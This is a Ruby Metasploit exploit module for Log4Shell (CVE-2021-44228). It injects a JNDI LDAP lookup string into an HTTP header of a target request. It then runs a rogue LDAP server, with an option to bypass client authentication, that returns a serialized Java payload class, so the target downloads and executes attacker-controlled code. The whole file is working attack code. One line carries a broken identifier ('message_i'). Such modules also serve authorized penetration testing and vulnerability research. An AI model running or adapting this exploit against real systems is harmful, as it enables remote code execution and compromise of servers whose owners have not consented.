class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
    # prepend Msf::Exploit::Remote::AutoCheck
    include Msf::Exploit::Remote::LDAP::Server
  
    def initialize
       super(
       'Name' => 'Log4Shell HTTP Header Injection',
       'Description' => %q{
          Send vulnerable header with JNDI injected URL from which the JVM will acquire
          and execute attacker controlled data.
       },
       'References' => [
          [ 'CVE', '2021-44228' ],
       ],
       'DisclosureDate' => '2021-12-09',
       'License' => MSF_LICENSE,
       'DefaultOptions' => {
          'SRVPORT' => 389
       },
       'Platform' => 'java',
       'Arch' => [ARCH_JAVA],
       'Targets' => [
          ['Automatic', {}]
       ],
       'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'AKA' => ['Log4Shell', 'LogJam'],
          'Reliability' => [REPEATABLE_SESSION]
       }
       )
  
       register_options([
          OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
          OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
          OptString.new('HTTP_HEADER', [ true, 'The header to inject', 'X-Api-Version']),
          OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true]),
       ])
    end
  
    def jndi_string
       "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}"
    end
  
    def serialized_payload(msg_id, base_dn)
       jar    = generate_payload.encoded_jar
       jclass = Rex::Text.to_octal(jar.entries[2].data) # extract class file - this is gross, need better accessor/raw generator for this
       jclass.extend(Net::BER::Extensions::String)
       pay    = jclass.chars.map(&:to_ber).to_ber_set
       attrk  = Rex::Text.rand_text_alpha_lower(4).to_ber
       attrs  = [ [ attrk, pay ].to_ber_sequence ]
       appseq = [
          base_dn.to_ber,
          attrs.to_ber_sequence
       ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
       [ msg_id.to_ber, appseq ].to_ber_sequence
    end
  
    def on_dispatch_request(client, data)
       return if data.strip.empty?
  
       data.extend(Net::BER::Extensions::String)
       begin
          pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
          vprint_status("LDAP request data remaining: #{data}") unless data.empty?
          resp = case pdu.app_tag
          when Net::LDAP::PDU::BindRequest # bind request
             client.authenticated = true
             service.encode_ldap_response(
             pdu.message_id,
             Net::LDAP::ResultCodeSuccess,
             '',
             '',
             Net::LDAP::PDU::BindResult
             )
          when Net::LDAP::PDU::SearchRequest # search request
             if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                client.write(serialized_payload(pdu.message_id, pdu.search_parameters[:base_object]))
                service.encode_ldap_response(pdu.message_id, Net::LDAP::ResultCodeSuccess, '', 'Search success', Net::LDAP::PDU::SearchResult)
             else
                service.encode_ldap_response(pdu.message_i, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
             end
          else
             vprint_status("Client sent unexpected request #{pdu.app_tag}")
             client.close
          end
          resp.nil? ? client.close : on_send_response(client, resp)
       rescue StandardError => e
          print_error("Failed to handle LDAP request due to #{e}")
          client.close
       end
       resp
    end
  
    def exploit
       start_service
       send_request_raw(
       'uri' => normalize_uri(target_uri),
       'method' => datastore['HTTP_METHOD'],
       'headers' => { datastore['HTTP_HEADER'] => jndi_string }
       )
       handler
    ensure
       stop_service
    end
  end
  